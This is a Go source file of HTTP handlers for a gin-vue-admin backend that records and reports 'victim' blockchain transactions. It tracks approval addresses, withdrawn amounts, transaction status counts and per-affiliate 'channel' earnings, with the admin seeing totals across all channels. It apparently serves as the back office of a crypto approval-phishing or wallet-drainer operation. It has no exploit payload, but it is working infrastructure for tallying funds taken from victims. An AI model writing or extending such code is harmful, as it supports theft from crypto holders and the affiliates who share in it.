package system

import (
	"fmt"
	"github.com/flipped-aurora/gin-vue-admin/server/api/v1/contract"
	"github.com/flipped-aurora/gin-vue-admin/server/global"
	"github.com/flipped-aurora/gin-vue-admin/server/model/common/request"
	"github.com/flipped-aurora/gin-vue-admin/server/model/common/response"
	"github.com/flipped-aurora/gin-vue-admin/server/model/system"
	systemReq "github.com/flipped-aurora/gin-vue-admin/server/model/system/request"
	systemRes "github.com/flipped-aurora/gin-vue-admin/server/model/system/response"
	"github.com/flipped-aurora/gin-vue-admin/server/utils"
	"github.com/gin-gonic/gin"
	"go.uber.org/zap"
	"log"
)

type SystemVictimTx struct{}

// Refresh
// @Tags      SysApi
// @Summary   创建基础api
// @Security  ApiKeyAuth
// @accept    application/json
// @Produce   application/json
// @Param     data  body      system.SysApi                  true  "api路径, api中文描述, api组, 方法"
// @Success   200   {object}  response.Response{msg=string}  "创建基础api"
// @Router    /victim/refresh [post]
func (s *SystemVictimTx) Refresh(c *gin.Context) {
	var tx system.SysVictimTx
	err := c.ShouldBindJSON(&tx)
	if err != nil {
		response.FailWithMessage(err.Error(), c)
		return
	}

	if tx.Refresh >= 10 {
		response.FailWithMessage("刷新次数过多", c)
		return
	}
	var sdk = new(contract.AlchemySDKService)
	_, isError := sdk.GetTxMeta(tx.TxHash)

	tx.Refresh = tx.Refresh + 1
	victimTxService.UpdateVictimTxRefresh(tx)

	if isError == "0" {
		response.OkWithMessage("交易成功", c)
	} else {
		response.FailWithMessage("交易失败", c)
	}
}

// CreateApi
// @Tags      SysApi
// @Summary   创建基础api
// @Security  ApiKeyAuth
// @accept    application/json
// @Produce   application/json
// @Param     data  body      system.SysApi                  true  "api路径, api中文描述, api组, 方法"
// @Success   200   {object}  response.Response{msg=string}  "创建基础api"
// @Router    /api/createApi [post]
func (s *SystemVictimTx) CreateVictimTx(c *gin.Context) {
	var tx system.SysVictimTx
	err := c.ShouldBindJSON(&tx)
	if err != nil {
		response.FailWithMessage(err.Error(), c)
		return
	}

	err = victimTxService.CreateVictimTx(tx)
	if err != nil {
		global.GVA_LOG.Error("创建失败!", zap.Error(err))
		response.FailWithMessage("创建失败", c)
		return
	}
	response.OkWithMessage("创建成功", c)
}

// GetApiList
// @Tags      SysApi
// @Summary   分页获取API列表
// @Security  ApiKeyAuth
// @accept    application/json
// @Produce   application/json
// @Param     data  body      systemReq.SearchApiParams                               true  "分页获取API列表"
// @Success   200   {object}  response.Response{data=response.PageResult,msg=string}  "分页获取API列表,返回包括列表,总数,页码,每页数量"
// @Router    /api/getApiList [post]
func (s *SystemVictimTx) GetSumVictimTxList(c *gin.Context) {
	uid := utils.GetUserID(c)
	log.Println("=======================GetSumVictimTxList=============================")
	log.Println("UID: ", uid)
	log.Println("========================GetSumVictimTxList============================")
	var pageInfo systemReq.SearchVictimTxParams
	err := c.ShouldBindJSON(&pageInfo)
	if err != nil {
		response.FailWithMessage(err.Error(), c)
		return
	}
	channel := pageInfo.Channel
	if uid != 1 {
		user, _ := userService.FindUserById(int(utils.GetUserID(c)))
		channel = user.Username
	}
	totalAmount, list, total, err := victimTxService.GetVictimTxInfoList(pageInfo.SysVictimTx, pageInfo.PageInfo, pageInfo.OrderKey, pageInfo.Desc, pageInfo.StartDate, pageInfo.EndDate, channel)
	if err != nil {
		global.GVA_LOG.Error("获取失败!", zap.Error(err))
		response.FailWithMessage("获取失败", c)
		return
	}
	response.OkWithDetailed(response.PageResult2{
		List:     list,
		Total:    total,
		Page:     pageInfo.Page,
		PageSize: pageInfo.PageSize,
		Amount:   totalAmount,
	}, "获取成功", c)
}

// GetApiList
// @Tags      SysApi
// @Summary   分页获取API列表
// @Security  ApiKeyAuth
// @accept    application/json
// @Produce   application/json
// @Param     data  body      systemReq.SearchApiParams                               true  "分页获取API列表"
// @Success   200   {object}  response.Response{data=response.PageResult,msg=string}  "分页获取API列表,返回包括列表,总数,页码,每页数量"
// @Router    /api/getApiList [post]
func (s *SystemVictimTx) GetVictimTxList(c *gin.Context) {
	var pageInfo systemReq.SearchVictimTxParams
	err := c.ShouldBindJSON(&pageInfo)
	if err != nil {
		response.FailWithMessage(err.Error(), c)
		return
	}
	uid := utils.GetUserID(c)
	log.Println("StartDate", pageInfo.StartDate)
	log.Println("EndDate", pageInfo.EndDate)
	log.Println("Channel", pageInfo.Channel)
	channel := pageInfo.Channel
	if uid != 1 {
		user, _ := userService.FindUserById(int(utils.GetUserID(c)))
		channel = user.Username
		pageInfo.Channel = channel
	}

	_, list, total, err := victimTxService.GetVictimTxInfoList(pageInfo.SysVictimTx, pageInfo.PageInfo, pageInfo.OrderKey, pageInfo.Desc, pageInfo.StartDate, pageInfo.EndDate, pageInfo.Channel)
	if err != nil {
		global.GVA_LOG.Error("获取失败!", zap.Error(err))
		response.FailWithMessage("获取失败", c)
		return
	}

	response.OkWithDetailed(response.PageResult{
		List:     list,
		Total:    total,
		Page:     pageInfo.Page,
		PageSize: pageInfo.PageSize,
	}, "获取成功", c)
}

// GetApiList
// @Tags      SysApi
// @Summary   分页获取API列表
// @Security  ApiKeyAuth
// @accept    application/json
// @Produce   application/json
// @Param     data  body      systemReq.SearchApiParams                               true  "分页获取API列表"
// @Success   200   {object}  response.Response{data=response.PageResult,msg=string}  "分页获取API列表,返回包括列表,总数,页码,每页数量"
// @Router    /api/getApiList [post]
func (s *SystemVictimTx) GetVictimTxById(c *gin.Context) {
	var idInfo request.GetById
	err := c.ShouldBindJSON(&idInfo)

	api, err := victimTxService.GetVictimTxById(idInfo.ID)
	if err != nil {
		global.GVA_LOG.Error("获取失败!", zap.Error(err))
		response.FailWithMessage("获取失败", c)
		return
	}
	response.OkWithDetailed(systemRes.SysVictimTxResponse{Victim: api}, "获取成功", c)
}

func (s *SystemVictimTx) StatVictimTxInfo(c *gin.Context) {
	var pageInfo systemReq.SearchVictimTxParams
	c.ShouldBindJSON(&pageInfo)
	//if err != nil {
	//	response.FailWithMessage(err.Error(), c)
	//	return
	//}

	log.Println("========StatVictimTxInfo======")
	log.Println(pageInfo.Channel)
	log.Println(pageInfo.StartDate)
	log.Println(pageInfo.EndDate)
	log.Println("========StatVictimTxInfo======")

	uid := utils.GetUserID(c)
	channel := ""
	if uid != 1 {
		user, _ := userService.FindUserById(int(utils.GetUserID(c)))
		channel = user.Username
	}
	if uid == 1 {
		channel = pageInfo.Channel
	}

	pendingCount, pendingAmount, _ := victimTxService.StatByStatus(0, channel, pageInfo.StartDate, pageInfo.EndDate)

	successCount, successAmount, _ := victimTxService.StatByStatus(2, channel, pageInfo.StartDate, pageInfo.EndDate)

	failureCount, failureAmount, _ := victimTxService.StatByStatus(3, channel, pageInfo.StartDate, pageInfo.EndDate)

	var statList = make(map[string]interface{})
	statList["init"] = pendingCount
	statList["pending"] = pendingCount
	statList["success"] = successCount
	statList["failure"] = failureCount

	var amountList = make(map[string]interface{})
	amountList["init"] = pendingAmount
	amountList["pending"] = pendingAmount
	amountList["success"] = successAmount
	amountList["failure"] = failureAmount
	response.OkWithDetailed(gin.H{"statList": statList, "amountList": amountList}, "获取成功", c)

}
func (s *SystemVictimTx) StatVictimTx2(c *gin.Context) {
	var pageInfo systemReq.SearchVictimTxParams
	c.ShouldBindJSON(&pageInfo)
	log.Println("========StatVictimTx2======")
	log.Println(pageInfo.Channel)
	log.Println(pageInfo.StartDate)
	log.Println(pageInfo.EndDate)
	log.Println("========StatVictimTx2======")
	uid := utils.GetUserID(c)
	channel := ""
	var results []system.SysUser
	if uid != 1 {
		user, _ := userService.FindUserById(int(utils.GetUserID(c)))
		channel = user.Username
		amount, _ := victimTxService.StatByChannelAndDate(channel, pageInfo.StartDate, pageInfo.EndDate)
		user.Amount = fmt.Sprintf("%v", amount)
		results = append(results, *user)
	}
	if uid == 1 {
		channel = pageInfo.Channel
		users, _ := userService.GetUserList()
		var total float64
		for _, user := range users {
			amount, _ := victimTxService.StatByChannelAndDate(user.Username, pageInfo.StartDate, pageInfo.EndDate)
			user.Amount = fmt.Sprintf("%v", amount)
			total = total + amount
			results = append(results, user)
		}

		for _, result := range results {
			if result.ID == 1 {
				result.Amount = fmt.Sprintf("%v", total)
			}
		}
	}
	response.OkWithDetailed(response.PageResult{
		List:     results,
		Total:    int64(len(results)),
		Page:     1,
		PageSize: 1000,
	}, "获取成功", c)
}

func (s *SystemVictimTx) StatVictimTx(c *gin.Context) {

	log.Println("============统计============")
	var tx system.SysVictimTx
	err := c.ShouldBindJSON(&tx)
	if err != nil {
		response.FailWithMessage(err.Error(), c)
		return
	}

	var victimList []system.SysVictimTx
	if tx.ApprovalAddress != "" {
		amount, _ := victimTxService.StatByApprovalAddress(tx.ApprovalAddress)
		var victimTx system.SysVictimTx
		victimTx.ApprovalAddress = tx.ApprovalAddress
		withdrawAmount := fmt.Sprintf("%f", amount)
		victimTx.WithdrawAmount = withdrawAmount
		victimList = append(victimList, victimTx)

	} else {
		if tx.PrimaryChannel != "" {
			amount, _ := victimTxService.StatByChannel(tx.PrimaryChannel)
			var victimTx system.SysVictimTx
			victimTx.PrimaryChannel = tx.PrimaryChannel
			withdrawAmount := fmt.Sprintf("%f", amount)
			victimTx.WithdrawAmount = withdrawAmount
			victimList = append(victimList, victimTx)
		}
		if tx.PrimaryChannel == "" {
			channles, _ := victimTxService.QueryUniqueChannel()
			for _, chnl := range channles {
				amount, _ := victimTxService.StatByChannel(chnl)

				var victimTx system.SysVictimTx
				victimTx.PrimaryChannel = chnl
				withdrawAmount := fmt.Sprintf("%f", amount)
				victimTx.WithdrawAmount = withdrawAmount
				victimList = append(victimList, victimTx)

			}

		}
	}
	if err != nil {
		global.GVA_LOG.Error("获取失败!", zap.Error(err))
		response.FailWithMessage("获取失败", c)
		return
	}

	response.OkWithDetailed(response.PageResult{
		List:     victimList,
		Total:    int64(len(victimList)),
		Page:     1,
		PageSize: 1000,
	}, "获取成功", c)
}
